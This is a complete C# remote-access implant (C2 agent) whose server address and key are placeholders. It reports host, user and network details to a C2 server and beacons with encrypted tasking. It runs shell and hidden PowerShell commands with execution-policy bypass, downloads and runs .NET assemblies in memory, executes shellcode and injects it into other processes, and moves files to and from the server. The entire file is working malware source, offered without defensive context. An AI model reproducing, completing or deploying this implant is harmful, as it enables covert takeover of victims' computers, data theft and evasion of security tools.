using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class C2Agent
{
    private static HttpClient client = new HttpClient();
    private static string key = "REPLACE_KEY";
    private static string ip = "REPLACE_IP";
    private static int port = int.Parse("REPLACE_PORT");
    private static string implantName = "REPLACE_NAME";
    private static int sleepTime = 5;

    // Windows API imports for in-memory execution
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    // Memory allocation constants
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_READWRITE = 0x04;
    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    private static Aes CreateAesObject(string key, byte[]? IV = null)
    {
        var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.Zeros;
        aes.BlockSize = 128;
        aes.KeySize = 256;

        if (IV != null)
            aes.IV = IV;

        if (!string.IsNullOrEmpty(key))
            aes.Key = Convert.FromBase64String(key);

        return aes;
    }

    private static string EncryptString(string key, string plainText)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(plainText);
        using (var aes = CreateAesObject(key))
        using (var encryptor = aes.CreateEncryptor())
        {
            byte[] encrypted = encryptor.TransformFinalBlock(bytes, 0, bytes.Length);
            byte[] fullData = aes.IV.Concat(encrypted).ToArray();
            return Convert.ToBase64String(fullData);
        }
    }

    private static string DecryptString(string key, string encryptedStringWithIV)
    {
        byte[] bytes = Convert.FromBase64String(encryptedStringWithIV);
        byte[] IV = bytes.Take(16).ToArray();
        using (var aes = CreateAesObject(key, IV))
        using (var decryptor = aes.CreateDecryptor())
        {
            byte[] decrypted = decryptor.TransformFinalBlock(bytes, 16, bytes.Length - 16);
            return Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
        }
    }

    private static string Exec(string filename, string arguments)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = filename,
                Arguments = arguments,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            }
        };

        process.Start();
        process.WaitForExit();
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        return output + error;
    }

    private static async Task<string> SendPostRequest(string url, string data)
    {
        var content = new FormUrlEncodedContent(new[]
        {
            new KeyValuePair<string, string>("result", data)
        });
        var response = await client.PostAsync(url, content);
        return await response.Content.ReadAsStringAsync();
    }

    private static async Task<string> SendGetRequest(string url)
    {
        var response = await client.GetAsync(url);
        return await response.Content.ReadAsStringAsync();
    }

    private static async Task<byte[]> DownloadBytes(string url)
    {
        var response = await client.GetAsync(url);
        return await response.Content.ReadAsByteArrayAsync();
    }

    private static async Task First()
    {
        string hostname = $"Machine_Name({Environment.MachineName})";
        string username = $"Username({Environment.UserName})";
        string localIPs = $"LocalIPs({string.Join(',', Dns.GetHostAddresses(Dns.GetHostName()).Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).Select(ip => ip.ToString()))})";
        string osInfo = $"OS({Environment.OSVersion})";
        string pid = $"PID({Process.GetCurrentProcess().Id})";

        string allInfo = hostname + username + localIPs + osInfo + pid;
        string encryptedInfo = EncryptString(key, allInfo);

        string recordUrl = $"http://{ip}:{port}/record/{implantName}";
        await SendPostRequest(recordUrl, encryptedInfo);
    }

    /// <summary>
    /// Execute .NET assembly in-memory without touching disk
    /// </summary>
    private static string ExecuteAssemblyInMemory(byte[] assemblyBytes, string[] args)
    {
        try
        {
            // Load assembly directly from bytes
            Assembly assembly = Assembly.Load(assemblyBytes);
            
            // Find entry point
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint == null)
            {
                // Try to find Main method
                foreach (Type type in assembly.GetTypes())
                {
                    entryPoint = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
                    if (entryPoint != null) break;
                }
            }

            if (entryPoint == null)
                return "Error: No entry point found in assembly";

            // Capture console output
            StringWriter sw = new StringWriter();
            TextWriter originalOut = Console.Out;
            TextWriter originalErr = Console.Error;
            Console.SetOut(sw);
            Console.SetError(sw);

            try
            {
                // Invoke entry point
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { args };
                entryPoint.Invoke(null, parameters);
            }
            finally
            {
                Console.SetOut(originalOut);
                Console.SetError(originalErr);
            }

            return sw.ToString();
        }
        catch (Exception ex)
        {
            return $"Assembly execution error: {ex.Message}\n{ex.InnerException?.Message}";
        }
    }

    /// <summary>
    /// Execute shellcode in current process memory
    /// </summary>
    private static string ExecuteShellcode(byte[] shellcode)
    {
        try
        {
            // Allocate executable memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
                return "Error: Failed to allocate memory";

            // Copy shellcode to allocated memory
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            // Create thread to execute shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
                return "Error: Failed to create thread";

            // Wait for execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return "Shellcode executed successfully";
        }
        catch (Exception ex)
        {
            return $"Shellcode execution error: {ex.Message}";
        }
    }

    /// <summary>
    /// Inject shellcode into remote process
    /// </summary>
    private static string InjectShellcode(int pid, byte[] shellcode)
    {
        try
        {
            // Open target process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == IntPtr.Zero)
                return $"Error: Failed to open process {pid}";

            // Allocate memory in target process
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                CloseHandle(hProcess);
                return "Error: Failed to allocate memory in target process";
            }

            // Write shellcode to target process
            IntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                CloseHandle(hProcess);
                return "Error: Failed to write to target process memory";
            }

            // Create remote thread to execute shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                CloseHandle(hProcess);
                return "Error: Failed to create remote thread";
            }

            CloseHandle(hThread);
            CloseHandle(hProcess);
            return $"Shellcode injected into PID {pid} successfully";
        }
        catch (Exception ex)
        {
            return $"Injection error: {ex.Message}";
        }
    }

    /// <summary>
    /// Execute PowerShell script without spawning powershell.exe
    /// Uses System.Management.Automation for in-process execution
    /// </summary>
    private static string ExecutePowerShellInMemory(string script)
    {
        try
        {
            // Load System.Management.Automation dynamically
            var psAssembly = Assembly.Load("System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            var psType = psAssembly.GetType("System.Management.Automation.PowerShell");
            var createMethod = psType.GetMethod("Create", new Type[] { });
            
            dynamic ps = createMethod.Invoke(null, null);
            ps.AddScript(script);
            
            var results = ps.Invoke();
            StringBuilder output = new StringBuilder();
            
            foreach (var result in results)
            {
                output.AppendLine(result?.ToString());
            }
            
            // Check for errors
            var errors = ps.Streams.Error;
            foreach (var error in errors)
            {
                output.AppendLine($"ERROR: {error}");
            }
            
            ps.Dispose();
            return output.ToString();
        }
        catch (Exception ex)
        {
            // Fallback to subprocess if in-process execution fails
            return Exec("powershell.exe", $"-NoP -NonI -W Hidden -Exec Bypass -Command \"{script}\"");
        }
    }

    /// <summary>
    /// Get system information
    /// </summary>
    private static string GetSystemInfo()
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine($"=== System Information ===");
        sb.AppendLine($"Hostname: {Environment.MachineName}");
        sb.AppendLine($"Username: {Environment.UserDomainName}\\{Environment.UserName}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"Architecture: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
        sb.AppendLine($"Process: {Process.GetCurrentProcess().ProcessName} (PID: {Process.GetCurrentProcess().Id})");
        sb.AppendLine($"Process Arch: {(Environment.Is64BitProcess ? "x64" : "x86")}");
        sb.AppendLine($".NET Version: {Environment.Version}");
        sb.AppendLine($"Working Directory: {Environment.CurrentDirectory}");
        sb.AppendLine($"Drives: {string.Join(", ", DriveInfo.GetDrives().Select(d => d.Name))}");
        
        try
        {
            var localIPs = Dns.GetHostAddresses(Dns.GetHostName())
                .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                .Select(ip => ip.ToString());
            sb.AppendLine($"IP Addresses: {string.Join(", ", localIPs)}");
        }
        catch { }
        
        return sb.ToString();
    }

    /// <summary>
    /// List running processes
    /// </summary>
    private static string ListProcesses()
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("PID\tName\t\t\tMemory (MB)");
        sb.AppendLine(new string('-', 60));
        
        foreach (var proc in Process.GetProcesses().OrderBy(p => p.ProcessName))
        {
            try
            {
                double memMB = proc.WorkingSet64 / (1024.0 * 1024.0);
                sb.AppendLine($"{proc.Id}\t{proc.ProcessName.PadRight(24)}\t{memMB:F2}");
            }
            catch { }
        }
        
        return sb.ToString();
    }

    /// <summary>
    /// Write file from base64 data (upload from C2)
    /// </summary>
    private static string WriteFileFromBase64(string path, string base64Data)
    {
        try
        {
            byte[] data = Convert.FromBase64String(base64Data);
            File.WriteAllBytes(path, data);
            return $"File written: {path} ({data.Length} bytes)";
        }
        catch (Exception ex)
        {
            return $"Error writing file: {ex.Message}";
        }
    }

    /// <summary>
    /// Read file and return as base64 (download to C2)
    /// </summary>
    private static string ReadFileAsBase64(string path)
    {
        try
        {
            byte[] data = File.ReadAllBytes(path);
            return Convert.ToBase64String(data);
        }
        catch (Exception ex)
        {
            return $"Error reading file: {ex.Message}";
        }
    }

    private static async Task Execute()
    {
        string taskUrl = $"http://{ip}:{port}/task/{implantName}";
        string beaconUrl = $"http://{ip}:{port}/beacon/{implantName}";
        string resultUrl = $"http://{ip}:{port}/result/{implantName}";

        while (true)
        {
            try
            {
                // Try beacon endpoint first (for in-memory tasks)
                string taskReq = "";
                try
                {
                    taskReq = await SendGetRequest(beaconUrl);
                }
                catch
                {
                    // Fallback to legacy task endpoint
                    taskReq = await SendGetRequest(taskUrl);
                }

                if (!string.IsNullOrEmpty(taskReq) && taskReq.Length > 10)
                {
                    string decTask = DecryptString(key, taskReq);
                    string[] decTaskSplit = decTask.Split(new[] { ' ' }, 2);
                    string command = decTaskSplit[0].ToLower();
                    string args = decTaskSplit.Length > 1 ? decTaskSplit[1] : "";

                    string results = "";

                    switch (command)
                    {
                        case "cmd":
                            results = Exec("cmd.exe", "/c " + args);
                            break;

                        case "powershell":
                            results = Exec("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"" + args + "\"");
                            break;

                        case "powerpick":
                        case "inline":
                            // Execute PowerShell without spawning powershell.exe
                            results = ExecutePowerShellInMemory(args);
                            break;

                        case "execute-assembly":
                            // Download and execute .NET assembly in memory
                            string[] assemblyArgs = args.Split(new[] { ' ' }, 2);
                            string assemblyUrl = assemblyArgs[0];
                            string[] invokeArgs = assemblyArgs.Length > 1 ? assemblyArgs[1].Split(' ') : new string[0];
                            
                            byte[] assemblyBytes = await DownloadBytes(assemblyUrl);
                            results = ExecuteAssemblyInMemory(assemblyBytes, invokeArgs);
                            break;

                        case "shellcode-exec":
                            // Execute shellcode from base64
                            byte[] shellcode = Convert.FromBase64String(args);
                            results = ExecuteShellcode(shellcode);
                            break;

                        case "shinject":
                            // Inject shellcode into remote process
                            string[] injectArgs = args.Split(new[] { ' ' }, 2);
                            int targetPid = int.Parse(injectArgs[0]);
                            byte[] scBytes = await DownloadBytes(injectArgs[1]);
                            results = InjectShellcode(targetPid, scBytes);
                            break;

                        case "sysinfo":
                            results = GetSystemInfo();
                            break;

                        case "ps":
                            results = ListProcesses();
                            break;

                        case "upload":
                            // Write file to disk from base64
                            string[] uploadArgs = args.Split(new[] { ' ' }, 2);
                            results = WriteFileFromBase64(uploadArgs[0], uploadArgs[1]);
                            break;

                        case "download":
                            // Read file and send to C2
                            results = ReadFileAsBase64(args);
                            break;

                        case "spawn":
                            // Spawn a new process
                            string spawnTarget = string.IsNullOrEmpty(args) ? "notepad.exe" : args;
                            try
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = spawnTarget,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                });
                                results = $"Spawned process: {spawnTarget}";
                            }
                            catch (Exception ex)
                            {
                                results = $"Failed to spawn process: {ex.Message}";
                            }
                            break;

                        case "sleep":
                            if (int.TryParse(args, out int newSleep))
                            {
                                sleepTime = newSleep;
                                results = $"Sleep time changed to {sleepTime} seconds";
                            }
                            else
                            {
                                results = "Invalid sleep time";
                            }
                            break;

                        case "exit":
                        case "kill":
                            Environment.Exit(0);
                            break;

                        default:
                            // Try to execute as shell command
                            results = Exec("cmd.exe", "/c " + decTask);
                            break;
                    }

                    // Send results back
                    if (!string.IsNullOrEmpty(results))
                    {
                        string encryptedResults = EncryptString(key, results);
                        await SendPostRequest(resultUrl, encryptedResults);
                    }
                }
            }
            catch (Exception ex)
            {
                // Silent failure - continue beacon loop
            }

            // Add jitter to sleep time (±20%)
            Random rnd = new Random();
            int jitter = (int)(sleepTime * 0.2);
            int actualSleep = sleepTime + rnd.Next(-jitter, jitter + 1);
            await Task.Delay(Math.Max(1, actualSleep) * 1000);
        }
    }

    public static async Task Main(string[] args)
    {
        // Set TLS 1.2 for HTTPS support
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        
        // Ignore certificate errors (for self-signed certs)
        ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;

        await First();
        await Execute();
    }
}
